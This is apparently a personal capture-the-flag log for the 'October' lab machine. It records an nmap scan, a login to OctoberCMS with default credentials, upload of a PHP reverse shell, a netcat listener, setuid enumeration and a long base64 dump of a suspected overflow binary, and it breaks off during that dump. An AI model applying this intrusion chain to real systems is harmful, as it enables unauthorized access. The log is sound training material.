Machine-Name  :  October
IP-Address    :  10.129.86.144

Command-Line: sudo nmap -A 10.129.86.144
Result:
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-16 22:38 UTC
    Nmap scan report for 10.129.86.144
    Host is up (0.099s latency).
    Not shown: 998 filtered ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
    |   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
    |_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    | http-methods:
    |_  Potentially risky methods: PUT PATCH DELETE
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: October CMS - Vanilla
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   96.98 ms 10.10.14.1
    2   97.62 ms 10.129.86.144

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 31.30 seconds


Command-Line: python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -t 50 -u http://10.129.86.144
Result:
    [01:31:05] 302 -  408B  - /backend  ->  http://10.129.86.144/backend/backend/auth]

Notes: OctoberCMS default credentials: "admin:admin"

Browser: http://10.129.86.144/backend/backend/auth
Username: admin
Password: admin
Result:
    *** LOGIN SUCCESSFUL ***

Command-Line: cp /usr/share/laudanum/php/php-reverse-shell.php .
Command-Line: mv /php-reverse-shell.php shell.php5
Command-Line: nc -lvnp 9001

Notes: After logging in I clicked on the media link and uploaded 'shell.php5'. After the upload was completed, I clicked the link to visit the media.
Result:
    *** REVERSE SHELL SUCCESSFUL ***

$: python3 -c 'import pty; pty.spawn("/bin/bash")'
Result: www-data@october:~$

www-data@october: cd /

www-data@october:/$ cd home/
Notes: Found username: "harry"
www-data@october:/home$ cd harry
www-data@october:/home/harry$ cat user.txt
Result: 29161ca87aa3d34929dc46efc40c89c0
    NAME: Harry Varthakouris
    PATH: /home/harry
    *** USER OWNED ***

Notes: Searching for setUID's.
www-data@october:/$ find -perm -4000 2>/dev/null
find -perm -4000 2>/dev/null
./bin/umount
./bin/ping
./bin/fusermount
./bin/su
./bin/ping6
./bin/mount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/mtr
./usr/bin/chsh
./usr/bin/at
./usr/sbin/pppd
./usr/sbin/uuidd
./usr/local/bin/ovrflw

Notes: /usr/local/bin/ovrflw seems like an overflow attack can be achieved using brute force methods.

www-data@october:/$ cd /usr/local/bin
www-data@october:/usr/local/bin$ ls -la
Result:
    total 16
    drwxr-xr-x  2 root root 4096 Apr 21  2017 .
    drwxr-xr-x 10 root root 4096 Apr 20  2017 ..
    -rwsr-xr-x  1 root root 7377 Apr 21  2017 ovrflw


www-data@october:/usr/local/bin$ ldd ovrflw | grep libc\
Result: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb763c000)

www-data@october:/usr/local/bin$ ldd ovrflw | grep libc
Result: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75dc000)

www-data@october:/usr/local/bin$ ldd ovrflw | grep libc
Result: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c8000)

Notes: libc using ASLR to randomize addresses.

Notes: Browser-Search: "The GNU Debugger is a portable debugger that runs on many Unix-like systems and works for many programming languages, including Ada, C, C++, Objective-C, Free Pascal, Fortran, Go, and partially others."

www-data@october:/usr/local/bin$ cat ovrflw | base64 -w0
Result:
    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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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2wAAAAyfBAgAAAAAAAASAOwAAAAUnwQIAAAAAAEAFQD1AAAACJ8ECAAAAAAAABIACAEAAACgBAgAAAAAAQAXAB4BAABAhQQIAgAAABIADQAuAQAAAAAAAAAAAAAgAAAASgEAALCDBAgEAAAAEgINAGABAAAgoAQIAAAAACAAGABrAQAAAAAAAAAAAAASAAAAfQEAACigBAgAAAAAEAAYAIQBAABEhQQIAAAAABIADgCKAQAAAAAAAAAAAAASAAAAnAEAACCgBAgAAAAAEAAYAKkBAAAAAAAAAAAAACAAAAC4AQAAAAAAAAAAAAASAAAAyAEAACSgBAgAAAAAEQIYANUBAABchQQIBAAAABEADwDkAQAAAAAAAAAAAAASAAAAAQIAANCEBAhhAAAAEgANABECAAAsoAQIAAAAABAAGQAWAgAAgIMECAAAAAASAA0AHQIAAFiFBAgEAAAAEQAPACQCAAAooAQIAAAAABAAGQAwAgAAfYQECE8AAAASAA0ANQIAAAAAAAAAAAAAIAAAAEkCAAAooAQIAAAAABECGABVAgAAAAAAAAAAAAAgAAAAbwIAAPSCBAgAAAAAEgALAABjcnRzdHVmZi5jAF9fSkNSX0xJU1RfXwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwByZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC42NTkxAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBvdnJmbHcuYwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19pbml0X2FycmF5X3N0YXJ0AF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9feDg2LmdldF9wY190aHVuay5ieABkYXRhX3N0YXJ0AHByaW50ZkBAR0xJQkNfMi4wAF9lZGF0YQBfZmluaQBzdHJjcHlAQEdMSUJDXzIuMABfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AZXhpdEBAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAF9fbGliY19jc3VfaW5pdABfZW5kAF9zdGFydABfZnBfaHcAX19ic3Nfc3RhcnQAbWFpbgBfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX2luaXQA

Command-Line: echo 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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA